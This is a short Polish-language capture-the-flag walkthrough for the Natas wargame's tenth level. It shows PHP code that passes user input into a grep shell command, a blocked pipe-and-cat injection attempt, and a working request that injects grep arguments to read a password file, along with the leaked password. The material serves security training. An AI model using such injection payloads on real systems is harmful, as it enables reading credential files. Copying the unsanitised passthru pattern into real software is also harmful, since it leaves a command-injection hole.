Ten poziom jest podobny do poprzedniego, z tym, że teraz następuje dodatkowo walidacja znaków w żądaniu

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Teraz podanie:
```
GET /?needle=|cat%20../../../../etc/natas_webpass/natas10&submit=Search HTTP/1.1
```
zwraca:
```
<pre>
Input contains an illegal character!
</pre>
```

Wiadomo, że hasło znajduje się w pliku "/etc/natas_webpass/natas11". Żeby się do niego dostać można napisać w grep wyszyukiwanie wszystkich ciągów znaków z podanego pliku z hasłem.
```
GET /?needle=.%20../../../../etc/natas_webpass/natas11
```
Wynik:
```
Output:
<pre>
../../../../etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
```